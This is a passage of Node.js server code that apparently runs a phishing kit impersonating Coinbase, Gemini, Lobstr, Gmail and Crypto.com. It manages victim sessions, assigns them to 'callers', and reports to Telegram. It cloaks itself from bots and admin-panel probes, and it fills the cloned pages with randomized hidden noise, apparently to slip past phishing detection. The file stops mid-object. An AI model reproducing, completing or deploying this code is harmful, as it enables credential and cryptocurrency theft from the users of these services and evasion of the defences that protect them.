import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { fileURLToPath } from 'url';
import { promises as fsPromises } from 'fs';
import BackgroundHTMLTransformer from './utils/BackgroundHTMLTransformer.js';
import { getTurnstileConfig, getAllBrandsTurnstileStatus } from './config/brandConfig.js';
import { resolvePageName, pageExistsForBrand } from './config/pageMapping.js';
import fs from 'fs';
import { dirname, join } from 'path';
import crypto from 'crypto';
import { verifyAdmin } from './middleware/auth.js';
import path from 'path';  // Add this with other imports
import { detectBot, antiBotUtils } from './middleware/antiBot.js';
import { scanPages } from './utils/pageScanner.js';
import { getIPDetails, getPublicIP } from './utils/ipUtils.js';
import { ipManager } from './utils/ipManager.js';
import { createIPBlocker } from './middleware/ipBlocker.js';
import fetch from 'node-fetch';
import {
    sendTelegramNotification,
    formatTelegramMessage,
    sendErrorNotification,
    initTelegramService,
    sendStatusUpdate
} from './services/telegram.js';
import { secureServer } from './middleware/security-middleware.js';
import cookieParser from 'cookie-parser';
import { exec } from 'child_process';
import { promisify } from 'util';
const execAsync = promisify(exec);
import dotenv from 'dotenv';
dotenv.config();
import { callerManager } from './services/callerManager.js';
import { callerSessionManager } from './services/callerSessionManager.js';
import { aliasManager } from './services/aliasManager.js';




const __dirname = dirname(fileURLToPath(import.meta.url));

class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.pendingSessions = new Map();
        this.urlToSession = new Map();
        this.verifiedSessions = new Set();
        this.pagesPath = join(__dirname, '../../public/pages');
        this.pageMap = new Map();
        this.initializePages();
    }

    initializePages() {
        // Add debug logging
        console.log('Scanning pages directory:', this.pagesPath);
        
        const pages = fs.readdirSync(this.pagesPath)
            .filter(file => file.endsWith('.html'))
            .map(file => ({
                path: join(this.pagesPath, file),
                name: file.replace('.html', '')
            }));
    
        console.log('Found pages:', pages);
    
        for (const page of pages) {
            // Store with original case
            this.pageMap.set(page.name, page.path);
            // Also store lowercase version
            this.pageMap.set(page.name.toLowerCase(), page.path);
        }
        
        console.log('Page map:', Array.from(this.pageMap.keys()));
    }

    createSession(sessionId, clientIP, userAgent, brand = 'gemini') {
        return this.createPendingSession(sessionId, clientIP, userAgent, brand);
    }

    createPendingSession(sessionId, clientIP, userAgent, brand = 'gemini') {
        const oauthChallenge = crypto.randomUUID();
        const session = {
            id: sessionId,
            clientIP,
            userAgent,
            oauthChallenge,
            brand: brand,  // Add brand info
            assignedTo: null,  // Track which caller this is assigned to
            currentPage: 'awaiting',
            verified: false,
            connected: true,
            loading: false,
            redirecting: false, // Add this flag
            lastHeartbeat: Date.now(),
            lastAccessed: Date.now(),
            createdAt: Date.now(),
            pending: true,
            ip: null,
            hostname: null,
            country: null,
            city: null,
            region: null,
            isp: null
        };
    
        this.pendingSessions.set(sessionId, session);
        this.updateSessionUrl(session);
        return session;
    }

    promotePendingSession(sessionId) {
        const pendingSession = this.pendingSessions.get(sessionId);
        if (pendingSession) {
            delete pendingSession.pending;
            this.sessions.set(sessionId, pendingSession);
            this.pendingSessions.delete(sessionId);
            return pendingSession;
        }
        return null;
    }

    updateSessionUrl(session) {
        // Remove old URL mapping if exists
        if (session.url) {
            this.urlToSession.delete(session.url);
        }

        // Clean the page name
        const pageName = session.currentPage
            .replace(/^\/+|\.html$/g, '')  // Remove leading slashes and .html
            .trim();

        // Create new URL with proper pages path
        const url = `/pages/${pageName}.html?client_id=${session.id}&oauth_challenge=${session.oauthChallenge}`;

        // Validate URL format
        if (!url.startsWith('/') || url.startsWith('//')) {
            console.error('Invalid URL format generated:', url);
            // Fix malformed URL
            const fixedUrl = '/' + url.replace(/^\/+/, '');
            session.url = fixedUrl;
            this.urlToSession.set(fixedUrl, session.id);
            return fixedUrl;
        }
    
        session.url = url;
        this.urlToSession.set(url, session.id);
        return url;
    }

    getSession(sessionId) {
        // Check both regular and pending sessions
        return this.sessions.get(sessionId) || this.pendingSessions.get(sessionId);
    }

    getSessionFromUrl(url) {
        const [path, query] = url.split('?');
        if (!query) return null;

        const params = new URLSearchParams(query);
        const sessionId = params.get('client_id');
        // Check both regular and pending sessions
        return this.getSession(sessionId);
    }

    verifySession(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            // If it's a pending session, promote it
            if (this.pendingSessions.has(sessionId)) {
                this.promotePendingSession(sessionId);
            }
            session.verified = true;
            this.verifiedSessions.add(sessionId);
            return true;
        }
        return false;
    }

    isVerified(sessionId) {
        return this.verifiedSessions.has(sessionId);
    }

    isPending(sessionId) {
        return this.pendingSessions.has(sessionId);
    }

    updateSessionPage(sessionId, page) {
        const session = this.getSession(sessionId);
        if (!session) return null;

        // Use the page mapping to resolve the correct file name based on brand
        const brand = session.brand || 'gemini';
        const resolvedPageName = resolvePageName(brand, page);

        // Check if the resolved page exists in our pageMap
        const actualPageName = Array.from(this.pageMap.keys()).find(
            key => key.toLowerCase() === resolvedPageName.toLowerCase()
        );

        if (!actualPageName) {
            console.log(`Page not found for brand ${brand}: ${page} -> ${resolvedPageName}`);
            return null;
        }

        session.currentPage = actualPageName;
        session.lastAccessed = Date.now();
        return this.updateSessionUrl(session);
    }

    validateSessionUrl(url) {
        const sessionId = this.urlToSession.get(url);
        if (!sessionId) return false;

        const session = this.getSession(sessionId);
        if (!session) return false;

        const [path, query] = url.split('?');
        if (!query) return false;

        const params = new URLSearchParams(query);
        return session.oauthChallenge === params.get('oauth_challenge');
    }

    validateAccess(clientId, oauthChallenge, currentIP, currentUserAgent) {
        const session = this.getSession(clientId);
        if (!session) {
            console.log('validateAccess: No session found for clientId:', clientId);
            return false;
        }

        // Check oauth challenge
        if (session.oauthChallenge !== oauthChallenge) {
            console.log('validateAccess: OAuth challenge mismatch');
            return false;
        }

        // For brand-prefixed session IDs, extract the base ID for comparison
        const baseClientId = clientId.includes('-') ? clientId.split('-')[1] : clientId;

        // Generate expected base session ID
        const expectedBaseId = crypto.createHash('sha256')
            .update(currentIP + currentUserAgent)
            .digest('hex')
            .slice(0, 8);

        // Verify the base session ID matches
        const isValid = baseClientId === expectedBaseId;
        if (!isValid) {
            console.log('validateAccess: Session ID mismatch', {
                baseClientId,
                expectedBaseId,
                currentIP,
                sessionIP: session.clientIP
            });
        }
        return isValid;
    }

    getPagePath(page, brand = 'gemini') {
        // Use the page mapping to resolve the correct file name
        const resolvedPageName = resolvePageName(brand, page);

        // Find the matching page name regardless of case
        const pageName = Array.from(this.pageMap.keys()).find(
            key => key.toLowerCase() === resolvedPageName.toLowerCase()
        );

        // Debug logging
        console.log('Page lookup:', {
            requested: page,
            brand: brand,
            resolved: resolvedPageName,
            found: pageName,
            availablePages: Array.from(this.pageMap.keys()).slice(0, 10) // Limit logging
        });

        return pageName ? this.pageMap.get(pageName) : null;
    }

    deleteSession(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            // Clear any pending timeouts
            if (session.disconnectTimeout) {
                clearTimeout(session.disconnectTimeout);
            }
            
            const timeout = loadingTimeouts.get(sessionId);
            if (timeout) {
                clearTimeout(timeout);
                loadingTimeouts.delete(sessionId);
            }
            
            this.urlToSession.delete(session.url);
            this.sessions.delete(sessionId);
            this.pendingSessions.delete(sessionId);
            this.verifiedSessions.delete(sessionId);
        }
    }

    getAllVerifiedSessions() {
        return Array.from(this.sessions.values())
            .filter(session => session.verified);
    }

    getAllPendingSessions() {
        return Array.from(this.pendingSessions.values());
    }

    cleanupSessions(maxAge = 30 * 60 * 1000, pendingMaxAge = 5 * 60 * 1000) {
        const now = Date.now();
        
        // Cleanup verified sessions
        for (const [sessionId, session] of this.sessions.entries()) {
            if (now - session.lastAccessed > maxAge) {
                this.deleteSession(sessionId);
            }
        }

        // Cleanup pending sessions with shorter timeout
        for (const [sessionId, session] of this.pendingSessions.entries()) {
            if (now - session.lastAccessed > pendingMaxAge) {
                this.deleteSession(sessionId);
            }
        }
    }

    getSessionCount() {
        return {
            verified: this.sessions.size,
            pending: this.pendingSessions.size,
            total: this.sessions.size + this.pendingSessions.size
        };
    }

    // Assignment management
    assignSessionToCaller(sessionId, callerId) {
        const session = this.getSession(sessionId);
        if (session) {
            session.assignedTo = callerId;
            return true;
        }
        return false;
    }

    unassignSession(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            session.assignedTo = null;
            return true;
        }
        return false;
    }

    getAssignedSessions(callerId) {
        const assigned = [];
        this.sessions.forEach(session => {
            // Only return verified sessions that are assigned to this caller
            if (session.assignedTo === callerId && session.verified) {
                assigned.push(session);
            }
        });
        return assigned;
    }

    clearAssignmentsForCaller(callerId) {
        let count = 0;
        this.sessions.forEach(session => {
            if (session.assignedTo === callerId) {
                session.assignedTo = null;
                count++;
            }
        });
        this.pendingSessions.forEach(session => {
            if (session.assignedTo === callerId) {
                session.assignedTo = null;
                count++;
            }
        });
        return count;
    }
}

// Brand configuration mapping
const BRAND_CONFIG = {
    'coinbase': {
        prefix: 'CB',
        loadingPage: 'Loading.html',  // Capital L for Coinbase
        officialDomain: 'www.coinbase.com',
        keywords: ['coinbase', 'cb']
    },
    'gemini': {
        prefix: 'GEMINI',
        loadingPage: 'geminiloading.html',
        officialDomain: 'www.gemini.com',
        keywords: ['gemini']
    },
    'lobstr': {
        prefix: 'LOBSTR',
        loadingPage: 'lobstrloading.html',
        officialDomain: 'www.lobstr.co',
        keywords: ['lobstr']
    },
    'gmail': {
        prefix: 'GMAIL',
        loadingPage: 'gmailloading.html',
        officialDomain: 'mail.google.com',
        keywords: ['gmail', 'google']
    },
    'cryptocom': {
        prefix: 'CRYPTO',
        loadingPage: 'cryptocomloading.html',
        officialDomain: 'crypto.com',
        keywords: ['crypto']
    }
};

// Detect brand from domain
const detectBrandFromDomain = (hostname) => {
    // Remove www. and convert to lowercase
    const cleanHost = hostname.toLowerCase().replace('www.', '');

    // Check each brand's keywords
    for (const [brand, config] of Object.entries(BRAND_CONFIG)) {
        for (const keyword of config.keywords) {
            if (cleanHost.includes(keyword)) {
                return brand;
            }
        }
    }

    // Default to gemini if no match
    return 'gemini';
};

// Generate stable session ID with brand prefix
const generateSessionId = (clientIP, userAgent, brand = 'gemini') => {
    const baseId = crypto.createHash('sha256')
        .update(clientIP + userAgent)
        .digest('hex')
        .slice(0, 8);

    const prefix = BRAND_CONFIG[brand]?.prefix || 'GEMINI';
    return `${prefix}-${baseId}`;
};

const BotLogger = {
    logFile: join(__dirname, '../../logs/detected_bots.txt'),
    jsonFile: join(__dirname, '../../logs/bot_signatures.json'),
    
    async initialize() {
        try {
            // Ensure logs directory exists
            const logsDir = join(__dirname, '../../logs');
            await fsPromises.mkdir(logsDir, { recursive: true });
            
            // Create files if they don't exist
            await fsPromises.access(this.logFile).catch(async () => {
                await fsPromises.writeFile(this.logFile, '');
            });
            
            await fsPromises.access(this.jsonFile).catch(async () => {
                await fsPromises.writeFile(this.jsonFile, '[]');
            });
        } catch (error) {
            console.error('Error initializing bot logger:', error);
        }
    },
    
    async logBot(data) {
        try {
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] IP: ${data.ip} | UA: ${data.userAgent} | Fields: ${JSON.stringify(data.fields)}\n`;
            
            // Append to text log
            await fsPromises.appendFile(this.logFile, logEntry);
            
            // Update JSON database
            const jsonContent = await fsPromises.readFile(this.jsonFile, 'utf8');
            const botList = JSON.parse(jsonContent || '[]');
            
            // Create signature object
            const signature = {
                ip: data.ip,
                userAgent: data.userAgent,
                timestamp,
                fields: data.fields,
                fingerprint: this.createFingerprint(data.userAgent)
            };
            
            // Check if similar signature exists
            const exists = botList.some(bot => 
                bot.userAgent === data.userAgent || bot.ip === data.ip
            );
            
            if (!exists) {
                botList.push(signature);
                await fsPromises.writeFile(
                    this.jsonFile, 
                    JSON.stringify(botList, null, 2)
                );
            }
            
            // Auto-ban if configured
            if (state.settings.autoBanBots) {
                ipManager.banIP(data.ip, {
                    bannedBy: 'honeypot',
                    bannedAt: timestamp,
                    reason: 'Honeypot trigger'
                });
                
                // Notify admin
                await sendTelegramNotification(formatTelegramMessage('bot_banned', {
                    ip: data.ip,
                    userAgent: data.userAgent,
                    reason: 'Honeypot trigger'
                }));
            }
            
        } catch (error) {
            console.error('Error logging bot:', error);
        }
    },
    
    createFingerprint(userAgent) {
        // Create a simplified fingerprint from user agent
        return userAgent
            .toLowerCase()
            .replace(/[^a-z0-9]/g, '')
            .slice(0, 32);
    }
};
const backgroundTransformer = new BackgroundHTMLTransformer(join(__dirname, '../../public/pages'));

// Initialize server components
const app = express();

app.use(express.json());
app.use(cookieParser());

secureServer(app);

loadBlockedIPs();



app.use((req, res, next) => {
    console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
    res.setHeader('Content-Security-Policy', [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com",
        "style-src 'self' 'unsafe-inline'",
        "frame-src https://challenges.cloudflare.com",  // This is crucial!
        "connect-src 'self' ws: wss:",
        "img-src 'self' data:",
        "media-src 'self' https:",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",
        "object-src 'none'"
    ].join('; '));
    next();
});




app.use('/pages', async (req, res, next) => {
    try {
        // Skip protection for non-HTML files (assets)
        if (!req.path.endsWith('.html')) {
            return next();
        }

        const params = new URLSearchParams(req.url.split('?')[1] || '');
        const clientId = params.get('client_id');
        const oauthChallenge = params.get('oauth_challenge');

        // Get client details for validation - use publicIP like in session creation
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0] ||
                        req.headers['x-real-ip'] ||
                        req.socket.remoteAddress;
        const publicIP = await getPublicIP(clientIP);
        const userAgent = req.headers['user-agent'] || '';

        // Debug logging
        console.log('Pages directory access attempt:', {
            path: req.path,
            clientId,
            oauthChallenge,
            clientIP,
            publicIP,
            userAgent,
            hasSession: !!sessionManager.getSession(clientId),
            isVerified: clientId ? sessionManager.isVerified(clientId) : false
        });

        // Special case for captcha.html - allow access with valid session parameters
        if (req.path === '/captcha.html') {
            if (clientId && oauthChallenge && sessionManager.validateAccess(clientId, oauthChallenge, publicIP, userAgent)) {
                return next();
            }
        } else {
            // For all other pages, require verified session and valid parameters
            if (!clientId || !oauthChallenge || !sessionManager.validateAccess(clientId, oauthChallenge, publicIP, userAgent)) {
                console.log('Invalid session parameters');
                return res.redirect('/');
            }

            if (!sessionManager.isVerified(clientId)) {
                console.log('Session not verified');
                return res.redirect('/');
            }
        }

        next();
    } catch (error) {
        console.error('Error in pages protection middleware:', error);
        res.redirect('/');
    }
});

// Dynamic captcha route to serve with correct domain
app.get('/pages/captcha.html', async (req, res, next) => {
    try {
        const clientId = req.query.client_id;
        const hostname = req.get('host') || req.hostname || 'localhost';
        const detectedBrand = detectBrandFromDomain(hostname);
        const officialDomain = BRAND_CONFIG[detectedBrand]?.officialDomain || 'www.gemini.com';

        // Get brand-specific Turnstile configuration
        const turnstileConfig = getTurnstileConfig(detectedBrand);

        // Use brand-specific site key or fall back to default
        const siteKey = turnstileConfig.siteKey || process.env.CLOUDFLARE_SITE_KEY;

        console.log(`[CAPTCHA] Brand: ${detectedBrand}, Using site key: ${siteKey ? 'configured' : 'missing'}`);

        // Generate captcha page with brand-specific key
        const captchaHTML = await backgroundTransformer.transformCaptchaPage(
            siteKey,
            state.settings.redirectUrl,
            officialDomain
        );

        res.type('html').send(captchaHTML);
    } catch (error) {
        console.error('Error serving dynamic captcha:', error);
        // Fallback to static file
        next();
    }
});

app.use('/pages', express.static(join(__dirname, '../../public/pages')));


// Admin protection middleware
app.use('/admin', (req, res, next) => {
    // Skip for asset requests
    if (req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
        return next();
    }

    const adminAttemptCookie = req.cookies.adminAttempt;
    console.log('[ADMIN] Cookie:', adminAttemptCookie);

    if (!adminAttemptCookie) {
        console.log('[ADMIN] First attempt - redirecting to Gemini');
        res.cookie('adminAttempt', '1', {
            maxAge: 300000, // 5 minutes
            httpOnly: true,
            secure: false,  // Set to true in production
            sameSite: 'lax'
        });
        return res.redirect('https://gemini.com');
    }

    console.log('[ADMIN] Second attempt - proceeding');
    res.clearCookie('adminAttempt');
    next();
});

// Serve static files for admin
app.use('/admin', express.static(join(__dirname, '../../dist/admin')));

// Admin SPA catch-all route
app.get('/admin/*', (req, res) => {
    res.sendFile(join(__dirname, '../../dist/admin/index.html'));
});
const server = createServer(app);

// Determine allowed origins based on environment
const getAllowedOrigins = () => {
  const baseOrigins = [
    'http://localhost:5173',
    'http://localhost:3000',
    'http://127.0.0.1:5173',
    'http://127.0.0.1:3000'
  ];
  
  // In production on Render, accept the domain from environment or use dynamic origin
  if (process.env.NODE_ENV === 'production' || process.env.RENDER === 'true') {
    // Accept any https domain (Render uses https)
    baseOrigins.push((origin, callback) => {
      // Allow all origins in production, since both frontend and backend are on same domain
      callback(null, true);
    });
  }
  
  return baseOrigins;
};

const io = new Server(server, {
    cors: {
        origin: getAllowedOrigins(),
        methods: ["GET", "POST"],
        credentials: true,
        allowedHeaders: ["Content-Type", "Authorization", "auth-token"]
    },
    allowEIO3: true,
    // Add these settings to help prevent ECONNABORTED errors
    pingTimeout: 60000,
    pingInterval: 25000,
    upgradeTimeout: 30000,
    transports: ['websocket', 'polling']
});




// Initialize managers and state
const sessionManager = new SessionManager();

const state = {
    settings: {
        websiteEnabled: true,
        redirectUrl: 'https://google.com',
        vpnBlockEnabled: false,
        antiBotEnabled: true,
        defaultLandingPage: 'geminiloading.html',
        captchaEnabled: false,
        availablePages: []
    },
    sessions: new Map(),
    bannedIPs: new Set(ipManager.getAllBannedIPs()),
    adminSessions: new Set()
};


const blockedIPs = new Set();

// Initialize available pages
const pagesPath = join(__dirname, '../../public/pages');
state.settings.availablePages = scanPages(pagesPath);

// Initialize Telegram integration
initTelegramService(state.settings);
await BotLogger.initialize();
await loadBlockedIPs();

const HTMLTransformer = {
    // Keep existing encryption strategies
    encryptionStrategies: {
        xor: (text, key) => Buffer.from(text).map((char, i) => char ^ key[i % key.length]).toString('base64'),
        shift: (text, key) => Buffer.from(text).map((char, i) => (char + key[i % key.length]) % 256).toString('base64'),
        reverse: (text, key) => Buffer.from(text).map((char, i) => char ^ key[key.length - 1 - (i % key.length)]).toString('base64')
    },

    selectEncryptionStrategy() {
        const strategies = Object.keys(this.encryptionStrategies);
        return strategies[crypto.randomBytes(1)[0] % strategies.length];
    },

    encrypt(text, key) {
        const strategy = this.selectEncryptionStrategy();
        return { data: this.encryptionStrategies[strategy](text, key), strategy };
    },

    generateKey() {
        const sizes = [16, 24, 32];
        const size = sizes[crypto.randomBytes(1)[0] % sizes.length];
        return crypto.randomBytes(size);
    },

    generateRandomString(length = 8) {
        return crypto.randomBytes(length).toString('hex');
    },

    // Generate massive amounts of safe, non-interfering noise
    generateNoiseElements() {
        const noiseTypes = [
            // Comments with random data
            () => `<!-- ${this.generateRandomString(64)} -->`,
            // Hidden divs with random attributes
            () => `<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="${this.generateRandomString(16)}" data-v="${this.generateRandomString(32)}" data-t="${Date.now()}"></div>`,
            // Meta tags with random content
            () => `<meta name="_n${this.generateRandomString(8)}" content="${this.generateRandomString(32)}" data-v="${this.generateRandomString(16)}">`,
            // Empty spans with random data
            () => `<span style="display:none!important" data-h="${this.generateRandomString(16)}" aria-hidden="true"></span>`,
            // More complex hidden elements
            () => `<div hidden style="display:none!important" data-r="${this.generateRandomString(8)}" data-s="${this.generateRandomString(16)}"><span data-v="${this.generateRandomString(8)}"></span></div>`,
            // Random data attributes
            () => `<div data-x="${this.generateRandomString(16)}" data-y="${this.generateRandomString(16)}" style="display:none!important"></div>`,
            // Time-based comments
            () => `<!-- t:${Date.now()}_${this.generateRandomString(32)} -->`,
            // Complex nested structure
            () => `<div style="display:none!important" data-n="${this.generateRandomString(8)}"><span data-t="${Date.now()}"><div data-h="${this.generateRandomString(16)}"></div></span></div>`,
            // Random base64 data
            () => `<!-- ${Buffer.from(this.generateRandomString(64)).toString('base64')} -->`,
            // Encrypted metadata
            () => {
                const key = this.generateKey();
                const data = this.encrypt(this.generateRandomString(32), key);
                return `<meta name="_e${this.generateRandomString(4)}" content="${data.data}" data-s="${data.strategy}">`;
            }
        ];

        // Generate a large number of noise elements
        const numElements = 20 + Math.floor(crypto.randomBytes(1)[0] % 30); // 20-50 elements
        let elements = [];
        
        // Generate primary noise
        for(let i = 0; i < numElements; i++) {
            const typeIndex = crypto.randomBytes(1)[0] % noiseTypes.length;
            elements.push(noiseTypes[typeIndex]());
        }

        // Add some nested noise structures
        const nestedNoise = `
            <div aria-hidden="true" style="display:none!important">
                ${Array.from({length: 5}, () => noiseTypes[crypto.randomBytes(1)[0] % noiseTypes.length]()).join('\n')}
                <div data-n="${this.generateRandomString(16)}">
                    ${Array.from({length: 3}, () => noiseTypes[crypto.randomBytes(1)[0] % noiseTypes.length]()).join('\n')}
                </div>
            </div>
        `;
        elements.push(nestedNoise);

        // Add encrypted metadata block
        const metadataBlock = `
            <!-- Metadata ${this.generateRandomString(8)} -->
            <div aria-hidden="true" style="display:none!important" data-v="${this.generateRandomString(16)}">
                <meta name="_m${this.generateRandomString(4)}" content="${this.encrypt(JSON.stringify({
                    t: Date.now(),
                    v: this.generateRandomString(16),
                    h: this.generateRandomString(32)
                }), this.generateKey()).data}">
            </div>
        `;
        elements.push(metadataBlock);

        // Shuffle all elements
        elements = elements.sort(() => crypto.randomBytes(1)[0] - 128);

        return elements.join('\n');
    },

    // Keep existing extractScripts method
    extractScripts(html) {
        const scripts = {
            socket: null,
            socketPlaceholder: null,
            inline: [],
            external: [],
            placeholders: []
        };

        // First preserve socket.io script
        const socketMatch = html.match(/<script[^>]*src=["']\/socket\.io\/socket\.io\.js["'][^>]*><\/script>/);
        if (socketMatch) {
            scripts.socketPlaceholder = `<!-- SOCKET_${this.generateRandomString(8)} -->`;
            scripts.socket = socketMatch[0];
            html = html.replace(socketMatch[0], scripts.socketPlaceholder);
        }

        // Then preserve all other scripts
        html = html.replace(/<script[\s\S]*?<\/script>/gi, (match) => {
            if (match.includes('SOCKET_')) return match;
            
            const placeholder = `<!-- SCRIPT_${this.generateRandomString(8)} -->`;
            if (match.includes('src=')) {
                scripts.external.push(match);
            } else {
                scripts.inline.push(match);
            }
            scripts.placeholders.push(placeholder);
            return placeholder;
        });

        return { html, scripts };
    },

    // Enhanced transformHTML with brand-specific domain replacement
    transformHTML(html, brand = 'gemini') {
        try {
            const nonce = this.generateRandomString(16);

            // Replace domain references based on brand
            const officialDomain = BRAND_CONFIG[brand]?.officialDomain || 'www.gemini.com';

            // Common domain patterns to replace
            const domainReplacements = {
                'www.coinbase.com': officialDomain,
                'coinbase.com': officialDomain.replace('www.', ''),
                'www.gemini.com': officialDomain,
                'gemini.com': officialDomain.replace('www.', ''),
                'www.lobstr.co': officialDomain,
                'lobstr.co': officialDomain.replace('www.', ''),
                'mail.google.com': officialDomain,
                'accounts.google.com': officialDomain
            };

            // Replace all domain references
            for (const [pattern, replacement] of Object.entries(domainReplacements)) {
                if (pattern !== replacement) {
                    html = html.replace(new RegExp(pattern, 'gi'), replacement);
                }
            }
            
            const { html: withoutScripts, scripts } = this.extractScripts(html);
            let transformedHtml = withoutScripts;

            // Add CSP meta
            const cspContent = [
                "default-src 'self'",
                `script-src 'self' 'unsafe-inline' 'unsafe-eval' 'nonce-${nonce}' https://challenges.cloudflare.com`,
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: https:",
                "font-src 'self' data: https:",
                "connect-src 'self' ws: wss:",
                "frame-src 'self' https://challenges.cloudflare.com",
                "media-src 'self' https:",
                "object-src 'none'"
            ].join('; ');

            const cspMeta = `<meta http-equiv="Content-Security-Policy" content="${cspContent}">`;

            // Ensure head exists
            if (!transformedHtml.includes('<head>')) {
                const htmlTag = transformedHtml.indexOf('<html');
                if (htmlTag !== -1) {
                    const insertPoint = transformedHtml.indexOf('>', htmlTag) + 1;
                    transformedHtml = 
                        transformedHtml.slice(0, insertPoint) +
                        '\n<head>\n</head>\n' +
                        transformedHtml.slice(insertPoint);
                }
            }

            // Add verification with extra noise
            const verificationScript = `
                <script nonce="${nonce}">
                    (function(){
                        window._v = {
                            t: ${Date.now()},
                            n: "${nonce}",
                            h: "${this.generateRandomString(12)}",
                            meta: "${this.generateRandomString(32)}",
                            data: {
                                v: "${this.generateRandomString(16)}",
                                t: "${Date.now()}",
                                h: "${this.generateRandomString(24)}"
                            }
                        };
                    })();
                </script>
            `;

            // Add massive noise at strategic points
            const headEnd = transformedHtml.indexOf('</head>');
            if (headEnd !== -1) {
                transformedHtml = 
                    transformedHtml.slice(0, headEnd) +
                    '\n' + cspMeta +
                    '\n' + this.generateNoiseElements() +
                    '\n' + verificationScript +
                    '\n' + this.generateNoiseElements() +
                    transformedHtml.slice(headEnd);
            }

            // Add noise to body
            const bodyStart = transformedHtml.indexOf('<body');
            if (bodyStart !== -1) {
                const insertPoint = transformedHtml.indexOf('>', bodyStart) + 1;
                transformedHtml = 
                    transformedHtml.slice(0, insertPoint) +
                    '\n' + this.generateNoiseElements() +
                    '\n' + this.generateNoiseElements() +
                    transformedHtml.slice(insertPoint);
            }

            // Add extensive attributes to html tag
            const htmlStart = transformedHtml.indexOf('<html');
            if (htmlStart !== -1) {
                const htmlAttrs = [
                    `data-v="${this.generateRandomString(16)}"`,
                    `data-t="${Date.now()}"`,
                    `data-n="${this.generateRandomString(12)}"`,
                    `data-h="${this.generateRandomString(24)}"`,
                    `data-x="${this.generateRandomString(16)}"`,
                    `data-m="${this.encrypt(this.generateRandomString(32), this.generateKey()).data}"`
                ].join(' ');

                transformedHtml = 
                    transformedHtml.slice(0, htmlStart) +
                    `<html ${htmlAttrs} ` +
                    transformedHtml.slice(htmlStart + 5);
            }

            // Restore scripts in correct order
            if (scripts.socket && scripts.socketPlaceholder) {
                transformedHtml = transformedHtml.replace(
                    scripts.socketPlaceholder,
                    scripts.socket
                );
            }

            scripts.external.forEach((script, i) => {
                transformedHtml = transformedHtml.replace(
                    scripts.placeholders[i],
                    script.replace(/<script/, `<script nonce="${nonce}"`)
                );
            });

            scripts.inline.forEach((script, i) => {
                transformedHtml = transformedHtml.replace(
                    scripts.placeholders[i + scripts.external.length],
                    script.replace(/<script/, `<script nonce="${nonce}"`)
                );
            });

            return { transformedHtml, nonce };
        } catch (error) {
            console.error('HTML transformation error:', error);
            return { transformedHtml: html, nonce: this.generateRandomString(16) };
        }
    }
};
// Page serving middleware
const pageServingMiddleware = async (req, res, next) => {
    try {
        // Define MIME types
        const mimeTypes = {
            '.js': 'application/javascript',
            '.css': 'text/css',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.ico': 'image/x-icon',
            '.svg': 'image/svg+xml',
            '.woff': 'application/font-woff',
            '.woff2': 'application/font-woff2',
            '.ttf': 'application/font-ttf',
            '.eot': 'application/vnd.ms-fontobject',
            '.otf': 'application/font-otf'
        };

        // Get file extension and path
        const requestedPath = req.url.split('?')[0];
        const ext = requestedPath.match(/\.[^.]+$/)?.[0];

        // Handle static assets
        if (ext && mimeTypes[ext]) {
            res.setHeader('Content-Type', mimeTypes[ext]);
            if (ext === '.css') {
                res.setHeader('X-Content-Type-Options', 'nosniff');
            }
            return next();
        }

        // Get session parameters
        const params = new URLSearchParams(req.url.split('?')[1] || '');
        const clientId = params.get('client_id');
        const oauthChallenge = params.get('oauth_challenge');
        
        let requestedPage = requestedPath.substring(1);

        // Security checks
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                        req.headers['x-real-ip'] || 
                        req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || '';

        if (!clientId || !oauthChallenge || !sessionManager.validateAccess(clientId, oauthChallenge, clientIP, userAgent)) {
            console.log('Invalid session parameters');
            return res.redirect('/');
        }

        const session = sessionManager.getSession(clientId);
        if (!session || !sessionManager.isVerified(clientId)) {
            console.log('Session not found or not verified');
            return res.redirect('/');
        }

        // Page validation
        const normalizedRequestedPage = requestedPage.replace('.html', '').toLowerCase();
        const normalizedSessionPage = session.currentPage.toLowerCase();
        
        if (normalizedRequestedPage !== normalizedSessionPage) {
            console.log('Page mismatch');
            return res.redirect(session.url);
        }

        // Ensure .html extension
        if (!requestedPage.endsWith('.html')) {
            requestedPage += '.html';
        }

        // Get and validate page path - pass the brand from session
        const pagePath = sessionManager.getPagePath(requestedPage, session.brand || 'gemini');
        if (!pagePath) {
            console.log('Page not found');
            return res.redirect('/');
        }

        try {
            // Read and transform the HTML file
            let html = await fs.promises.readFile(pagePath, 'utf8');

            // Replace placeholders if session has them
            if (session && session.placeholders) {
                for (const [key, value] of Object.entries(session.placeholders)) {
                    const placeholder = `{{placeholders.${key}}}`;
                    html = html.replace(new RegExp(placeholder, 'g'), value);
                }
            }

            // Get brand from session for domain replacement
            const sessionBrand = session.brand || 'gemini';
            const { transformedHtml, nonce } = HTMLTransformer.transformHTML(html, sessionBrand);

            // Set comprehensive security headers
            const securityHeaders = {
                'Content-Security-Policy': [
                    "default-src 'self'",
                    `script-src 'self' 'unsafe-inline' 'unsafe-eval' 'nonce-${nonce}' https://challenges.cloudflare.com`,
                    "style-src 'self' 'unsafe-inline'",
                    "img-src 'self' data: https:",
                    "font-src 'self' data: https:",
                    "connect-src 'self' ws: wss:",
                    "frame-src 'self' https://challenges.cloudflare.com",
                    "media-src 'self' https:",
                    "object-src 'none'"
                ].join('; '),
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'SAMEORIGIN',
                'X-XSS-Protection': '1; mode=block',
                'Referrer-Policy': 'strict-origin-when-cross-origin',
                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
